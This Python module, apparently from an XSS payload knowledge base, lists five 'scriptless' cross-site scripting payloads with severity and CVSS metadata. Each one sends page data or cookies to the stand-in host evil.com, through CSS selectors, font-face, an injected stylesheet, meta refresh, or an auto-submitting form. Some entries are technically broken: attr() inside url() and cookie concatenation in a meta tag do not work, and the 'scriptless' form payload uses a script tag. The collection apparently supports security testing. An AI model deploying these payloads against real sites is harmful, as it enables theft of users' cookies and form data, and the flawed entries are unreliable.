#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Scriptless XSS Techniques
"""

from ..models import PayloadEntry


SCRIPTLESS_PAYLOADS = {
    "scriptless_1": PayloadEntry(
        payload="<style>input[value^='a']{background:url('https://evil.com/a')}</style>",
        contexts=["html_content", "css"],
        severity="medium",
        cvss_score=6.0,
        description="CSS attribute selector exfil",
        tags=["scriptless", "css", "exfil"],
        reliability="medium",
    ),
    "scriptless_2": PayloadEntry(
        payload="<style>@font-face{font-family:'x';src:url('https://evil.com/'+attr(value))}</style>",
        contexts=["html_content", "css"],
        severity="medium",
        cvss_score=6.0,
        description="CSS font-face exfil",
        tags=["scriptless", "css", "font-face"],
        reliability="low",
    ),
    "scriptless_3": PayloadEntry(
        payload="<link rel=stylesheet href='https://evil.com/exfil.css'>",
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.0,
        description="External stylesheet injection",
        tags=["scriptless", "stylesheet", "external"],
        reliability="high",
    ),
    "scriptless_4": PayloadEntry(
        payload="<meta http-equiv=refresh content='0;url=https://evil.com/?c='+document.cookie>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Meta refresh with cookie (may not work)",
        tags=["scriptless", "meta", "refresh"],
        reliability="low",
    ),
    "scriptless_5": PayloadEntry(
        payload="<form action='https://evil.com/collect' method=post><input name=data></form><script>document.forms[0].submit()</script>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Form auto-submit",
        tags=["form", "auto-submit", "exfil"],
        reliability="high",
    ),
}

SCRIPTLESS_PAYLOADS_TOTAL = len(SCRIPTLESS_PAYLOADS)
